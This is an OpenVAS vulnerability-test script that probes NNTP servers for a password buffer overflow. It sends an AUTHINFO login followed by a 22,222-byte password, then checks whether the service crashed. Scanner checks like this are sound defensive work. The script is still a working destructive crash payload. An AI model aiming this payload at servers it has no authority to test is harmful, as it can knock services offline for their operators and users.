# OpenVAS Vulnerability Test
# Description: NNTP password overflow
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Overflow on the user name is tested by cassandra_nntp_dos.nasl
#
# NNTP protocol is defined by RFC 977
# NNTP message format is defined by RFC 1036 (obsoletes 850); see also RFC 822.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17229");
  script_version("2020-08-24T08:40:10+0000");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NNTP password overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2005 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("nntpserver_detect.nasl", "nntp_info.nasl", "logins.nasl");
  script_require_ports("Services/nntp", 119);
  script_mandatory_keys("nntp/detected");

  script_tag(name:"solution", value:"Apply the latest patches from your vendor or
  use a safer software.");

  script_tag(name:"summary", value:"The scanner was able to crash the remote NNTP server by sending
  a too long password. This flaw is probably a buffer overflow and might be exploitable to
  run arbitrary code on this machine.");

  script_tag(name:"qod_type", value:"remote_banner_unreliable");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("nntp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

user = get_kb_item("nntp/login");
if(!user) {
  vtstrings = get_vt_strings();
  user = vtstrings["lowercase"];
}

port = nntp_get_port(default:119);

ready = get_kb_item("nntp/" + port + "/ready");
if(!ready)
  exit(0);

s = open_sock_tcp(port);
if(!s)
  exit(0);

line = recv_line(socket:s, length:2048);

send(socket:s, data:strcat('AUTHINFO USER ', user, '\r\n'));
buff = recv_line(socket:s, length:2048);
send(socket:s, data:strcat(crap(22222), '\r\n'));
buff = recv_line(socket:s, length:2048);
close(s);
sleep(1);

s = open_sock_tcp(port);
if(!s) {
  security_message(port:port);
  exit(0);
} else {
  close(s);
}

if(!buff) {
  security_message(port:port, data:"The remote NNTP daemon abruptly closes the connection when it receives a too long password.

  It might be vulnerable to an exploitable buffer overflow, so an attacker might run arbitrary code on this machine.");
  exit(0);
}

exit(99);
